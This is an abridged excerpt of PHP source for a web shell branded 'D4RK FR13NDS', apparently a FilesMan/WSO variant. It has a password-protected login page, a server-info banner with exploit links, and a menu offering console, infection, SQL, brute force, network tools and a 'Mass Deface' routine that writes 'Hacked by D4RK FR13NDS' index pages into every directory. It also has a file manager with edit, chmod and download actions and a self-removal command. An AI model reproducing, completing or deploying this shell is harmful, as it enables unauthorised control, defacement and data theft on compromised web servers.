<?php 
$▛ = "42a9c634ac7c169874d0fbd1d666d2f7";
$▘ = true; 
$▜ = 'UTF-8'; 
$▚ = 'FilesMan'; 
...
function hardLogin() { 
    ...
    die("<body bgcolor='black'><title>ups</title><pre align=center><img src='http://www.rosechem.com/images/content/banner_s63.jpg' width='350' height='350px'><form method=post><br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='mypass' value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>"); 
} 
...
<title>D4RK FR13NDS</title> 
<center><link href='http://www.nubihaxor.com' target='_blank'><font color='lime' size='5'>Infinite Haxor</link></font></center>
<style> 
...
<input type=hidden name=charset> 
    ...
    $release = @php_uname('r'); 
    $kernel = @php_uname('s'); 
    $explink = 'http://www.nubihaxor.com/'; 
    ...
    $m = array('Sec. Info'=>'SecInfo','Files Man'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Safe Mode'=>'SafeMode','String Tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network'); 
    if(!empty($GLOBALS['▛'])) 
    $m['Mass Deface'] = 'MassDeface'; 
    $m['Logout'] = 'Logout'; 
    ...
    /* (С) 08.2015 dmkcv */ 
    echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span><br>System:<br>User:<br>Php:<br>Hdd:<br>Curr.DIR:<br>'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'. 
         '<td><nobr><font color=lime><br>'.substr(@php_uname(), 0, 120).' </font><a href="http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="'.$explink.'" target=_blank>[ Exploit-DB ]</a></nobr><br><font color=lime>'.$uid.' ( '.$user.' ) </font><span>Group:</span><font color=lime> '.$gid.' ( ' .$group. ' )</font><br><font color=lime>'.@phpversion().' </font><span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#FFDB5F><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span><font color=lime> '.date('Y-m-d H:i:s').'</font><br><font color=lime>'.viewSize($totalSpace).' </font><span>Free:</span><font color=lime> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)</font><br>'.$cwd_links.' [ '.viewPermsColor($GLOBALS['cwd']).' ] <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'. 
         '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Your IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'. 
...
function actionMassDeface() { 
        hardHeader(); 
echo '<h1>Mass Deface</h1><div class=content>'; 
...
echo "Your Index : <br><textarea style='width: 500px; height: 250px;' name='index'>Hacked by D4RK FR13NDS</textarea><br>";
        ...
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        ...
                        if (file_put_contents ($index, $_POST['index']))
                            echo '<span><font color="YELLOW">- Mass Done -</font></span>';
                }
        endforeach;
 }
...
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>"; 
    ...
    foreach($files as $f) { 
        echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>').'</a></td><td>'.(($f['type']=='file')?viewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms'] 
            .'</td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">Rename | </a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">Touch | </a>'.(($f['type']=='file')?' <a class="tooltip" data-tooltip="Frame" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'frame\')">Frame | </a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">Edit | </a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">Download |</a>':'').'</td></tr>'; 
        $l = $l?0:1; 
    } 
...
function actionSelfRemove() { 
    ...
    if($_POST['p1'] != 'yes') 
        hardHeader(); 
    echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')"><font color="GREEN">Yes</font></a></div>'; 
    hardFooter(); 
} 
